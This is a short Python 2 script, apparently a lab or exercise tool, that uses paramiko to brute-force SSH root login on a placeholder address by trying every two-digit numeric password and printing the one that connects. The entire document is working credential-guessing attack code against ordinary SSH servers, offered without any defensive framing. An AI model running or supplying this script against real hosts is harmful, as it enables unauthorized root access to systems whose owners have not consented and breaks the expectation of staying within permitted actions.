#!/usr/bin/env python
import itertools
import paramiko
string='0123456789'
var = itertools.imap("".join,itertools.product(string,repeat=2))

for i in var:
	ssh=paramiko.SSHClient()
	ssh.load_system_host_keys()
	ssh.set_missing_host_key_policy(paramiko.MissingHostKeyPolicy())
	try:
		print i
		ssh.connect('*.*.*.*',port=22,username='root',password=i)
		print "Connection pass. Password= "+i
	except paramiko.AuthenticationException, error:
		continue
	ssh.close()

